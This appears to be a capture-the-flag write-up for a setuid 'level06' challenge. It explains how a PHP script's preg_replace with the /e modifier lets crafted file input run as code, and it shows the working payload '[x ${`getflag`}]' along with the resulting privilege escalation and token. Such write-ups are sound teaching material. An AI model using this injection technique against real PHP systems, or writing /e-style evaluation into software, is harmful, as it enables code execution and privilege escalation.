
In our home directory, we have an executable with suid, and a php script allowing us to know what the executable does:
        >$ ls -la
        -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
        -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

        >$ cat level06.php
                #!/usr/bin/php
                <?php
                function y($m) {
                    $m = preg_replace("/\./", " x ", $m);
                    $m = preg_replace("/@/", " y", $m);
                    return $m;
                    }
                function x($y, $z) {
                    $a = file_get_contents($y);
                    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
                    $a = preg_replace("/\[/", "(", $a);
                    $a = preg_replace("/\]/", ")", $a); return $a;
                }
                $r = x($argv[1], $argv[2]); print $r;
                ?>

In the second function called by the script, we see the use of a regex with /e modifier, 
and this modifier is depecrated in recent php regex flags, 
so if it is set, preg_replace() does normal substitution of backreferences in the replacement string, 
evaluates it as PHP code, and uses the result for replacing the search string, 
so it can easily introduce remote code execution vulnerabilities.

so we can exploit this by passing our own code, which will be evaluated as PHP code and executed as user flag06.

our argument should pass the regex test `"/(\[x (.*)\])/e"`, and respect the form `[x <our PHP code>]`:
        >$ echo '[x ${`getflag`}]' > /tmp/getflag
        >$ cat /tmp/getflag
        [x ${`getflag`}]

When we run the executable, passing our file as argument:
        >$ ./level06 /tmp/getflag
        PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
        in /home/user/level06/level06.php(4) : regexp code on line 1

Vulnerability:
Deprecated /e regex modifier in script owned by privileged user -> Privilege escalation via PHP code injection.

Documentations:
* https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
* https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.nowdoc
* https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier